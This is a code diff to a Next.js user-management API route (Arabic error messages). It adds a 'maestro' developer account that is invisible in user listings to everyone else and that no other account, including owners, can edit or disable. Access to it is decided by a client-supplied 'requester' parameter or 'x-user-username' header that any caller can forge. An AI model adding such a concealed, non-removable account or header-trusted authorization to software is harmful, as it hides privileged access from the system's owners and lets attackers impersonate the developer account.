@@ -5,10 +5,16 @@ export async function GET(req: Request) {
   try {
     const { searchParams } = new URL(req.url);
     const branchId = searchParams.get("branchId");
+    const requester = searchParams.get("requester") || req.headers.get("x-user-username");
 
     const where: any = {};
     if (branchId && branchId !== "ALL") {
       where.OR = [{ branchId }, { branchId: null }];
+    }
+
+    // Maestro (System Creator & Developer) is strictly invisible to all other accounts!
+    if (requester?.trim().toLowerCase() !== "maestro") {
+      where.username = { not: "maestro" };
     }
 
     const users = await prisma.user.findMany({
@@ -53,6 +59,13 @@ export async function POST(req: Request) {
       );
     }
 
+    if (username.trim().toLowerCase() === "maestro") {
+      return NextResponse.json(
+        { success: false, error: "اسم المستخدم محجوز لنظام التشغيل والمطور" },
+        { status: 403 }
+      );
+    }
+
     const existing = await prisma.user.findUnique({
       where: { username: username.trim().toLowerCase() },
     });
@@ -92,11 +105,12 @@ export async function PATCH(req: Request) {
       return NextResponse.json({ success: false, error: "معرف المستخدم مطلوب" }, { status: 400 });
     }
 
-    // Owner protection
+    // Owner & Developer protection: Maestro can NEVER be edited, modified, or disabled by anyone else!
     const targetUser = await prisma.user.findUnique({ where: { id } });
-    if (targetUser?.username === "maestro" && isActive === false) {
+    const requester = (body.requester || req.headers.get("x-user-username"))?.trim().toLowerCase();
+    if (targetUser?.username === "maestro" && requester !== "maestro") {
       return NextResponse.json(
-        { success: false, error: "لا يمكن تعطيل حساب المالك الأساسي (Maestro)" },
+        { success: false, error: "حساب المطور والمالك الأساسي (Maestro) محمي بالكامل ومحجوب عن التعديل" },
         { status: 403 }
       );
     }
